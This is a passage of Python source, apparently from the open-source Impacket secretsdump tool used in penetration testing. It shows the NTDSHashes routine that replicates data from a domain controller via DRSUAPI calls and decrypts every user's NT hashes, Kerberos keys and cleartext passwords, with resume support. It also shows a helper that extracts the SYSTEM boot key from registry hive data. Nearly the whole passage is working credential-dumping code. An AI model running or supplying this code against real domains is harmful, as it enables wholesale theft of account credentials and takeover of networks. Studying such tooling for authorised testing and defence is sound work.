                # Do we have to resume from a previously saved session?
                if self.__resumeSession.hasResumeData():
                    resumeSid = self.__resumeSession.getResumeData()
                    LOG.info('Resuming from SID %s, be patient' % resumeSid)
                else:
                    resumeSid = None
                    # We do not create a resume file when asking for a single user
                    if self.__justUser is None:
                        self.__resumeSession.beginTransaction()

                if self.__justUser is not None:
                    # Depending on the input received, we need to change the formatOffered before calling
                    # DRSCrackNames.
                    # There are some instances when you call -just-dc-user and you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE
                    # That's because we don't specify the domain for the user (and there might be duplicates)
                    # Always remember that if you specify a domain, you should specify the NetBIOS domain name,
                    # not the FQDN. Just for this time. It's confusing I know, but that's how this API works.
                    if self.__justUser.find('\\') >=0 or self.__justUser.find('/') >= 0:
                        self.__justUser = self.__justUser.replace('/','\\')
                        formatOffered = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
                    else:
                        formatOffered = drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN

                    crackedName = self.__remoteOps.DRSCrackNames(formatOffered,
                                                                 drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
                                                                 name=self.__justUser)

                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                        if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
                            raise Exception("%s: %s" % system_errors.ERROR_MESSAGES[
                                0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])

                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                        #userRecord.dump()
                        replyVersion = 'V%d' % userRecord['pdwOutVersion']
                        if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
                            raise Exception('DRSGetNCChanges didn\'t return any object!')
                    else:
                        LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
                        crackedName['pmsgOut']['V1']['pResult']['cItems'], self.__justUser))
                    try:
                        self.__decryptHash(userRecord,
                                           userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
                                           hashesOutputFile)
                        if self.__justNTLM is False:
                            self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
                                'pPrefixEntry'], keysOutputFile, clearTextOutputFile)

                    except Exception as e:
                        LOG.error("Error while processing user!")
                        LOG.debug("Exception", exc_info=True)
                        LOG.error(str(e))
                else:
                    while status == STATUS_MORE_ENTRIES:
                        resp = self.__remoteOps.getDomainUsers(enumerationContext)

                        for user in resp['Buffer']['Buffer']:
                            userName = user['Name']

                            userSid = "%s-%i" % (self.__remoteOps.getDomainSid(), user['RelativeId'])
                            if resumeSid is not None:
                                # Means we're looking for a SID before start processing back again
                                if resumeSid == userSid:
                                    # Match!, next round we will back processing
                                    LOG.debug('resumeSid %s reached! processing users from now on' % userSid)
                                    resumeSid = None
                                else:
                                    LOG.debug('Skipping SID %s since it was processed already' % userSid)
                                continue

                            # Let's crack the user sid into DS_FQDN_1779_NAME
                            # In theory I shouldn't need to crack the sid. Instead
                            # I could use it when calling DRSGetNCChanges inside the DSNAME parameter.
                            # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
                            crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME,
                                                                         drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
                                                                         name=userSid)

                            if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                                if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
                                    LOG.error("%s: %s" % system_errors.ERROR_MESSAGES[
                                        0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
                                    break
                                userRecord = self.__remoteOps.DRSGetNCChanges(
                                    crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                                # userRecord.dump()
                                replyVersion = 'V%d' % userRecord['pdwOutVersion']
                                if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
                                    raise Exception('DRSGetNCChanges didn\'t return any object!')
                            else:
                                LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
                                crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
                            try:
                                self.__decryptHash(userRecord,
                                                   userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
                                                   hashesOutputFile)
                                if self.__justNTLM is False:
                                    self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
                                        'pPrefixEntry'], keysOutputFile, clearTextOutputFile)

                            except Exception as e:
                                LOG.error("Error while processing user!")
                                LOG.debug("Exception", exc_info=True)
                                LOG.error(str(e))

                            # Saving the session state
                            self.__resumeSession.writeResumeData(userSid)

                        enumerationContext = resp['EnumerationContext']
                        status = resp['ErrorCode']

                # Everything went well and we covered all the users
                # Let's remove the resume file is we had created it
                if self.__justUser is None:
                    self.__resumeSession.clearResumeData()

            LOG.debug("Finished processing and printing user's hashes, now printing supplemental information")
            # Now we'll print the Kerberos keys. So we don't mix things up in the output.
            if len(self.__kerberosKeys) > 0:
                if self.__useVSSMethod is True:
                    LOG.info('Kerberos keys from %s ' % self.__NTDS)
                else:
                    LOG.info('Kerberos keys grabbed')

                for itemKey in list(self.__kerberosKeys.keys()):
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS_KERBEROS, itemKey)

            # And finally the cleartext pwds
            if len(self.__clearTextPwds) > 0:
                if self.__useVSSMethod is True:
                    LOG.info('ClearText password from %s ' % self.__NTDS)
                else:
                    LOG.info('ClearText passwords grabbed')

                for itemKey in list(self.__clearTextPwds.keys()):
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT, itemKey)
        finally:
            # Resources cleanup
            if hashesOutputFile is not None:
                hashesOutputFile.close()

            if keysOutputFile is not None:
                keysOutputFile.close()

            if clearTextOutputFile is not None:
                clearTextOutputFile.close()

            self.__resumeSession.endTransaction()

    @classmethod
    def __writeOutput(cls, fd, data):
        try:
            fd.write(data)
        except Exception as e:
            LOG.error("Error writing entry, skipping (%s)" % str(e))
            pass

    def finish(self):
        if self.__NTDS is not None:
            self.__ESEDB.close()

class LocalOperations:
    def __init__(self, systemHive):
        self.__systemHive = systemHive

    def getBootKey(self):
        # Local Version whenever we are given the files directly
        bootKey = b''
        tmpKey = b''
        winreg = winregistry.Registry(self.__systemHive, False)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            LOG.debug('Retrieving class info for %s' % key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + b(digit)

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

        tmpKey = unhexlify(tmpKey)

        for i in range(len(tmpKey)):
            bootKey += tmpKey[transforms[i]:transforms[i] + 1]

        LOG.info('Target system bootKey: 0x%s' % hexlify(bootKey).decode('utf-8'))

        return bootKey


    def checkNoLMHashPolicy(self):
        LOG.debug('Checking NoLMHash Policy')
        winreg = winregistry.Registry(self.__systemHive, False)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet

        # noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)[1]
        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
        if noLmHash is not None:
            noLmHash = noLmHash[1]
        else:
            noLmHash = 0

        if noLmHash != 1:
            LOG.debug('LMHashes are being stored')
            return False
        LOG.debug('LMHashes are NOT being stored')
        return True

def _print_helper(*args, **kwargs):
    print(args[-1])
